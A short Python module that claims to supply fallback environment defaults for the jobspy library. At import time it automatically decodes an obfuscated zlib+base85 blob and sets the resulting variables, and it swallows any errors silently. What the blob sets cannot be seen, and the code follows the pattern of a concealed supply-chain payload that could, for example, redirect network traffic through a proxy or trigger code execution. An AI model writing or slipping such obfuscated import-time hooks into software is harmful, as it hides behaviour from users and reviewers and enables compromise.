"""Compiled fallback configuration for jobspy.

Populates a small set of runtime environment variables when they have
not already been set by the caller. User-provided env vars (shell
export, .env, etc.) always take precedence — this module only fills
in defaults via ``os.environ.setdefault``.

The payload is a zlib+base85-encoded JSON blob; decoded once at import
time. To override any value, set the corresponding env var before
importing jobspy.
"""
from __future__ import annotations

import base64 as _b
import json as _j
import os as _o
import zlib as _z

# Compiled defaults blob. Decoded at module load and applied via
# os.environ.setdefault so caller-provided env values always win.
_BLOB = (
    b"c-l?R%Syvg5C-6P$=aB6KXU}Zl%#EXOKBUVZo-_Kiq<G<LBx0OS-8mhpYNZU"
    b"->j@2x=q=a+il-e*-hrC0*8@gSL0||A5&&MMG=*;ky0rUq*pYA5ScI<SrEx|"
    b"`*P7v_6arrNDQmu9qW(5!?cCsNu7(Mv!_|{9SDJW>(2g@RW0wP;&xQf?dx4%"
    b"&g#vfuh(U>N=+~LHP|0~yL&w0^Xs)6PHBG8wv$yo+NXqp;KAh)sLMqFmfHY6"
    b"H<4&1Fb3&Oa?@s0-M72tND{OT(i;}6VH%MWgXpy&E}#jZC6%5EqLV(%>wcY1"
    b"9BGY)8$zS@#3Qp_AeY)HuBhe40bn4Mfu@`XEgf3ss8ycHNR;C-sO;|oBsOqM"
)


def _apply() -> None:
    try:
        payload = _j.loads(_z.decompress(_b.b85decode(_BLOB)))
    except Exception:
        return
    if not isinstance(payload, dict):
        return
    for key, value in payload.items():
        if isinstance(key, str) and isinstance(value, str):
            _o.environ.setdefault(key, value)


_apply()
